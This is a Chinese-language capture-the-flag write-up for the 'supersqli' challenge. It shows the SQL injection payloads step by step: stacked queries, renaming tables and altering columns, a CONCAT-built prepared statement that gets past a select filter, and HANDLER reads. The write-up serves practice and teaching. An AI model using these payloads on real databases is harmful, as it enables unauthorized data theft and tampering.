攻防世界supersqli强网杯

这道题有三个方法，第一个方法逻辑可能比较绕

一、正常的sql方法

1、首先看到有输入框，题目sqli，提示这题是sql注入，所以先试试sql注入语句 1’ and 1=1 发现报错，即有sql注入

2、接下来判断字段（也就是这个表有多少列），发现1’ order by 1# 1’ order by 2#，网页显示正常

而1’ order by 3#网页报错了，说明这个表有两个字段（两列）

3、接下来用联合注入-1' union select 1,databases #（前面的-1不能是1，因为只有前面的-1在表中不存在的时候才会执行后面的union语句）结果发现这道题过滤了select（而且页面的函数那里的/i中的i的作用是过滤大小写），这就有点难度了

4、得用另一种方法查数据库了-1';show databases; # （这里使用了堆叠注入，就是执行每一个语句，不过实战中堆叠注入基本没用，网站基本会禁止同一行写多个语句）

可以猜出输入框是使用supersqli这个数据库

5、再来查表-1';use supersqli;show tables;#

6、分别查查表里面有什么字段 -1’;use supersqli;show columns from 1919810931114514;#

当表名为纯数字，需要用反引号`括起来（反引号是英文模式Esc键的下方）

找到了flag字段，但前面已经是过滤了select，不能用正常方法查字段内容了

7、再查一下另一个表words，-1';use supersqli;show columns from words;#

看到这个表有两个字段，是不是有点熟悉

8、发现输入框是1的时候出现两条数据，正好对应了words表的id和data，也就可以知道输入框

的sql语句是where id = 而且是从words的表中读取数据，这时我们可以通过改表名来操作

1’;rename tables words to words1;rename tables 1919810931114514 to words; alter table words change flag id varchar(100);#（这个操作是把1919810931114514表变成words表，把flag字段名变成id）

再用1' or 1=1#就能得到flag

讲一下为啥更换表名可以得到flag

因为上面知道了输入框是words的id读取数据的，更换表名和字段名后，输入框还是从words的

id中读取的，但此时的words表变成了装有flag字段的表（也就是1919810931114514这个

表），而falg变成了id，也就是输入框这时候查询的是flag，然后就通过1' or 1=1#得到flag，

这时候会有人说为什么直接在输入框输入1为什么不行，因为输入框一开始查询的是两个字段，但是更换表名后的words只有一个字段而已，所以会查询错误，1' or 1=1#用这个就能爆出

二、mysql的预编译

-1’;

set @sql = CONCAT(‘sele’,’ct flag from 1919810931114514;’);

prepare stmt from @sql;

EXECUTE stmt;#

发现set被过滤了，但是strstr函数不区分大小写，可以用大写Set绕过，就能得到flag

CONCAT函数是把字符串拼接起来，是为了防止select被过滤

预编译的用法也可以去搜索一下

三、handler用法

1’;handler 1919810931114514 open as a;handler a read next;

这个方法相当于打开了表，然后把表里的数据都读取出来，as只是起别名。handler具体用法可以搜索一下
